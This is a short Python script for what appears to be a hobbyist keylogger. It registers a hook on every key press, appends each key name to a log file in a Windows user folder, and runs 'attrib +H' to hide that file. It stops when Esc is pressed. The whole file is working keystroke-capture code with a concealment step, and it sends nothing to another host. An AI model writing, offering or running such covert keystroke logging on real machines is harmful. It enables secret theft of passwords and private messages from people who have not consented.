import keyboard
import subprocess

log = "C:/Users/fadis/.log.txt"

def on_key_press(event):
    with open(log, "a") as file:
        subprocess.run(["attrib", "+H", log], check=True)
        file.write("{}\n".format(event.name))

    if event.name == "esc":
        exit()

# Creating the log file nad hiding it
# log = open("C:/Users/fadis/.log.txt", "x")

# Writing the First line to the log file and closes it
# log.write("Beginning of logfile")
# log.close()

# Registering the Keystrokes
keyboard.on_press(on_key_press)

# Review what the fuck this line does
keyboard.wait()
